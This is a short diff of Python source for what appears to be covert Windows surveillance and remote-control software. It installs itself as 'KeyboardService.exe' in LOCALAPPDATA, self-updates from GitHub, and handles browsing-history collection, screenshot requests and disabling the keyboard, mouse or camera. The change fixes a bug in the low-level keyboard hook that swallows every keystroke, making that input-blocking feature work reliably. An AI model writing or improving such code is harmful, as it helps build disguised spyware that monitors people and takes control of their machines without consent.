@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.0.3"
+APP_VERSION = "1.0.7"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -108,6 +108,7 @@ mouse_disable_lock = Lock()
 keyboard_disable_lock = Lock()
 camera_disable_lock = Lock()
 mouse_hook_callback = None
+keyboard_hook_callback = None
 browser_history_seen = set()
 
 SHIFTED_SYMBOLS = {
@@ -1016,6 +1017,7 @@ def start_keyboard_disable(duration):
 
 
 def keyboard_disable_worker(duration, ready, result):
+    global keyboard_hook_callback
     user32 = ctypes.windll.user32
     kernel32 = ctypes.windll.kernel32
     hook_type = 13
@@ -1024,8 +1026,8 @@ def keyboard_disable_worker(duration, ready, result):
     def low_level_keyboard_proc(_code, _wparam, _lparam):
         return 1
 
-    keyboard_hook = callback_type(low_level_keyboard_proc)
-    hook = user32.SetWindowsHookExW(hook_type, keyboard_hook, kernel32.GetModuleHandleW(None), 0)
+    keyboard_hook_callback = callback_type(low_level_keyboard_proc)
+    hook = user32.SetWindowsHookExW(hook_type, keyboard_hook_callback, kernel32.GetModuleHandleW(None), 0)
     if not hook:
         result["error"] = f"Could not install keyboard hook: {ctypes.get_last_error()}"
         ready.set()
@@ -1043,6 +1045,7 @@ def keyboard_disable_worker(duration, ready, result):
             user32.DispatchMessageW(ctypes.byref(message))
     finally:
         user32.UnhookWindowsHookEx(hook)
+        keyboard_hook_callback = None
         keyboard_disable_lock.release()
 
 
